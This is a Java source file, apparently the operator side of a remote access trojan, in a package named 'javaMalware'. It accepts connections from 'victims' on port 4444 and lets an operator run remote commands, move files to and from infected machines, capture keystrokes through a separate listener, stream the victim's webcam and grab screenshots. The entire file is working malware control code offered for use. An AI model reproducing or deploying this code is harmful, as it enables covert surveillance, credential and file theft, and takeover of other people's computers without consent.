package javaMalware;

import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.Image;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectInputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Random;
import java.util.Scanner;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.regex.Pattern;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;

public class Control extends javax.swing.JFrame {
    private static ServerSocket server;
    private static int clients;
    private static int var = 0;
    private static boolean stop_threads;
    private static ArrayList<Socket> ips = new ArrayList<Socket>();
    private static ArrayList<String> history = new ArrayList<String>();
    public Control(ServerSocket server){
        Control.server = server;
    }
    public static void main(String[] args) throws IOException, ClassNotFoundException, InterruptedException { 
        clients = 0;
        stop_threads = false; 
        server = new ServerSocket(4444);
        System.out.println("Server is running at port 4444........");
        server.setReuseAddress(true);
        ServerThread st = new ServerThread(server,ips,clients,stop_threads);
        st.start();
        while(true){
            System.out.print("Center: ");
            Scanner scanner = new Scanner(System.in);
            String center = scanner.nextLine();
            if(!center.equals("history")){history.add(center);}
            if(center.equals("targets")){
                if(ips.isEmpty()){System.out.println("--> No targets");}
                else{
                    for (int i=0; i<ips.size(); i++){
                        Socket target = ips.get(i);
                        int count = i + 1;
                        System.out.println("--> Session " + count + ": " + target);
                    }
                }
            }
            else if(center.contains("sessions")){
                if(ips.size() == 0){System.out.println("--> No sessions");}
                else{
                    String[] words = center.split("\\s");
                    if(words.length != 2){System.out.println("--> Error cmd");}
                    else{
                        if(!isNumeric(words[1])){System.out.println("--> Error cmd");}
                        else{
                            int number = Integer.parseInt(words[1]);
                            if(number > ips.size() || number <= 0){System.out.println("--> Session isn't exist");}
                            else{
                                System.out.println("--> Interact with session " + number);
                                shell(ips.get(number -1),number);
                            }
                        }
                    }
                }
            }
            else if(center.equals("history")){
                if(history.size()<=0){System.out.println("--> History empty");}
                else{
                    for (int i=0; i<history.size(); i++){
                        String target = history.get(i);
                        int count = i + 1;
                        System.out.println(count + "--> " + ": " + target);
                    }
                }
            }
            else if(center.equals("help")){
                System.out.println("--> targets - to list all victims");
                System.out.println("--> sessions <number> - to interact with the respective session");
                System.out.println("--> history - to list all entered cmd");
                System.out.println("--> help - to show this instruction");
                System.out.println("--> exit - to quit program");
            }
            else if(center.equals("exit")){
                System.exit(0);
            }
            else{
                System.out.println("--> Error cmd");
            }
        }
    }
    public static boolean isNumeric(String strNum) {
        Pattern pattern = Pattern.compile("-?\\d+(\\.\\d+)?");
        if (strNum == null) {
            return false; 
        }
        return pattern.matcher(strNum).matches();
    }
    public static String generateFileName(int len) {
        String chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijk"+"lmnopqrstuvwxyz!@#$%&";
        Random rnd = new Random();
        StringBuilder sb = new StringBuilder(len);
        for (int i = 0; i < len; i++)
                sb.append(chars.charAt(rnd.nextInt(chars.length())));
        return sb.toString();
    }
    public static void shell(Socket socket, int number) throws IOException, ClassNotFoundException, InterruptedException{
        while(true){
            OutputStream outputStream = socket.getOutputStream();
            DataOutputStream dataOutputStream = new DataOutputStream(outputStream);
            //Enter cmd
            System.out.print("#(session " + number + ") cmd: ");
            Scanner scanner = new Scanner(System.in);
            String cmd = scanner.nextLine();
            history.add(cmd);
            //Help banner
            if(cmd.equals("help")){
                System.out.println("---> download <source_file> <destination_file>");
                System.out.println("---> upload <source_file> <destination_file>");
                System.out.println("---> keylogger - to get pressed keys");
                System.out.println("---> screenshot - to screenshot target's screen");
                System.out.println("---> webcam - to access target's webcam");
                System.out.println("---> sessions - to list all current sessions");
                System.out.println("---> help - to show this intruction");
                System.out.println("---> exit - to quit this session and back center");
            }
            else if(cmd.equals("sessions")){
                for (int i=0; i<ips.size(); i++){
                    Socket target = ips.get(i);
                    int count = i + 1;
                    System.out.println("--> Session " + count + ": " + target);
                }
            }
            else if(cmd.equals("exit")){
                System.out.println("---> You just have exited session " + number);
                System.out.println("---> Bye Friend!!");
                break;
            }
            else{
                //Send cmd
                dataOutputStream.writeUTF(cmd);
                dataOutputStream.flush();
                //Receive result
                InputStream inputStream = socket.getInputStream();
                DataInputStream dataInputStream = new DataInputStream(inputStream);
                //Download file
                if(cmd.contains("download")){
                    String[] words = cmd.split("\\s");
                    if(words.length!=3){System.out.println("---> Error cmd");}
                    else{
                        int bytes = 0;
                        FileOutputStream fileOutputStream = new FileOutputStream(words[2]);
                        long size = dataInputStream.readLong();     // read file size
                        byte[] buffer = new byte[4*1024];
                        while (size > 0 && (bytes = dataInputStream.read(buffer, 0, (int)Math.min(buffer.length, size))) != -1) {
                            fileOutputStream.write(buffer,0,bytes);
                            size -= bytes;      // read upto file size
                        }
                        fileOutputStream.close();
                        System.out.println("---> Download file successfully");
                    }
                }
                //Upload file
                else if(cmd.contains("upload")){
                    String[] words = cmd.split("\\s");
                    if(words.length!=3){System.out.println("---> Error cmd");}
                    else{
                        File f = new File(words[1]);
                        if(!f.exists()){System.out.println("---> Source file isn't exist");}
                        else{
                            int bytes = 0;
                            File file = new File(words[1]);
                            FileInputStream fileInputStream = new FileInputStream(file);

                            // send file size
                            dataOutputStream.writeLong(file.length());  
                            // break file into chunks
                            byte[] buffer = new byte[4*1024];
                            while ((bytes=fileInputStream.read(buffer))!=-1){
                                dataOutputStream.write(buffer,0,bytes);
                                dataOutputStream.flush();
                            }
                            fileInputStream.close();
                            System.out.println("---> Upload file successfully");
                        }
                    }
                }
                else if(cmd.equals("keylogger")){
                    ServerSocket sr = new ServerSocket(1234);
                    Socket s = sr.accept();
                    System.out.println("---> Listening victim press keyboard......");
                    System.out.println("---> Enter 'quit' to return to the main interface");
                    Thread t1 = new Thread(new Runnable(){
                        public void run(){
                            while(var == 0){
                                //Receive result
                                try {
                                    InputStream is = s.getInputStream();
                                    DataInputStream dis = new DataInputStream(is);
                                    System.out.print(dis.readUTF());
                                } catch (IOException ex) {
                                    Logger.getLogger(Control.class.getName()).log(Level.SEVERE, null, ex);
                                }
                            }
                        }
                    });t1.start();   
                    Thread t2 = new Thread(new Runnable(){
                        public void run(){
                            while(var == 0){
                                try {
                                    OutputStream os = s.getOutputStream();
                                    DataOutputStream dos = new DataOutputStream(os);
                                    //Enter cmd
                                    System.out.print(">>> ");
                                    Scanner scanner = new Scanner(System.in);
                                    String cmd = scanner.nextLine();
                                    dos.writeUTF(cmd);
                                    dos.flush();
                                    if(cmd.equals("quit")){
                                        t1.stop();
                                        var = 1;
                                    }
                                } catch (IOException ex) {
                                    Logger.getLogger(Control.class.getName()).log(Level.SEVERE, null, ex);
                                }
                            }
                        }
                    });t2.start();
                    t2.join();
                    if(var == 1){
                        t2.stop();
                        sr.close();
                        s.close();
                    }
                }
                else if(cmd.equals("webcam")){
                    JFrame frame=new JFrame();
                    frame.setLayout(new FlowLayout());
                    frame.setSize(670,510);
                    frame.setTitle("Victim's webcam");
                    JLabel lbl=new JLabel();
                    lbl.setPreferredSize(new Dimension(640, 480));
                    frame.add(lbl);
                    frame.setVisible(true);
                    frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
                    ObjectInputStream in = new ObjectInputStream(socket.getInputStream());
                    ImageIcon ic;
                    while(true){
                        ic = (ImageIcon) in.readObject();
                        Image img = ic.getImage();
                        Image imgScale = img.getScaledInstance(lbl.getWidth(), lbl.getHeight(), Image.SCALE_SMOOTH);
                        ImageIcon scaledIcon = new ImageIcon(imgScale);
                        lbl.setIcon(scaledIcon);
                    }
                }
                else if(cmd.contains("screenshot")){
                    int bytes = 0;
                    String fileName = "C:/users/asus/desktop/".concat(generateFileName(6)).concat(".jpg");
                    FileOutputStream fileOutputStream = new FileOutputStream(fileName);
                    long size = dataInputStream.readLong();     // read file size
                    byte[] buffer = new byte[4*1024];
                    while (size > 0 && (bytes = dataInputStream.read(buffer, 0, (int)Math.min(buffer.length, size))) != -1) {
                        fileOutputStream.write(buffer,0,bytes);
                        size -= bytes;      // read upto file size
                    }
                    fileOutputStream.close();
                    System.out.println("---> Output " + fileName);
                    System.out.println("---> Screenshot successfully"); 
                }
                else{
                    System.out.println(dataInputStream.readUTF());
                }
            }
        }
    }
}

class ServerThread extends Thread{
    ServerSocket s = null;
    Socket socket = null;
    ArrayList<Socket> ips = null;
    int clients;
    boolean stop_threads;
    public ServerThread(ServerSocket s, ArrayList<Socket> ips, int clients, boolean stop_threas){
        this.ips = ips;
        this.s = s;
        this.clients = clients;
        this.stop_threads = stop_threads;
    }
    public void run(){
        while(true){
            if(stop_threads){break;}
            try {
                socket = s.accept();
                ips.add(socket);
                clients++;
                System.out.println("\n--> New connection from " + socket.getRemoteSocketAddress());
                System.out.print("--> There are " + clients + " sessions.  Enter 'targets' command to list all sessions\nCenter: ");
            } catch (IOException ex) {
                Logger.getLogger(ServerThread.class.getName()).log(Level.SEVERE, null, ex);
            }
        }
    }
}

